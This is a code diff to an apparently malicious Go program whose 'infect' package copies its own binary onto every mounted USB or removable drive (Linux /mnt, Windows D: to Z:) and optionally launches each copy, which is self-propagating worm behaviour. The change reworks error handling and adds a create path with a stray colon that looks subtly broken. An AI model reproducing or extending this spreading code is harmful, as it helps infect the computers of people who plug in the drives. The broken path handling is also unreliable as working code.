@@ -33,11 +33,12 @@ func USB(base_64_serialize_json string) string {
 		usb_devices, err := os.ReadDir("/mnt")
 		if err != nil {
 			notify.Error(err.Error(), "infect.USB()")
-			//return
+		} else {
+			for _, line := range usb_devices {
+				data_structure = json.Receive(Disk(line.Name(), json.Send(data_structure)))
+			}
 		}
-		for _, line := range usb_devices {
-			data_structure = json.Receive(Disk(line.Name(), json.Send(data_structure)))
-		}
+
 	case "windows":
 		driver_names := []string{"D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"}
 		for _, drive := range driver_names {
@@ -57,24 +58,22 @@ func Disk(location string, base_64_serialize_json string) string {
 	if err != nil {
 		in.Close()
 		notify.Error(err.Error(), "infect.Disk()")
-		//return
+	} else {
+		if !contains.EndsWith(location, []string{"/"}) {
+			location += "/"
+		}
+		dst, err := os.Create(fmt.Sprintf("%s:%s", location, data_structure.Get_binary_name())) // Creates our target
+		if err == nil {
+			_, err = io.Copy(dst, in)
+			if err != nil {
+				notify.Error(err.Error(), "infect.Disk()")
+			} else {
+				if data_structure.Get_status_start_malware_on_birth() { // Start the newly created malware
+					go iio.Run_file(fmt.Sprintf("%s%s", location, data_structure.Get_binary_name())) // Spawns a new process
+				}
+			}
+		}
 	}
-	if !contains.EndsWith(location, []string{"/"}) {
-		location += "/"
-	}
-	dst, err := os.Create(location + data_structure.Get_binary_name()) // Creates our target
-	if err != nil {
-		//return
-	}
-	_, err = io.Copy(dst, in)
-	if err != nil {
-		notify.Error(err.Error(), "infect.Disk()")
-		//return
-	}
-	if data_structure.Get_status_start_malware_on_birth() { // Start the newly created malware
-		go iio.Run_file(fmt.Sprintf("%s%s", location, data_structure.Get_binary_name())) // Spawns a new process
-	}
-
 	return json.Send(data_structure)
 }
 func Disk_random(base_64_serialize_json string) string {
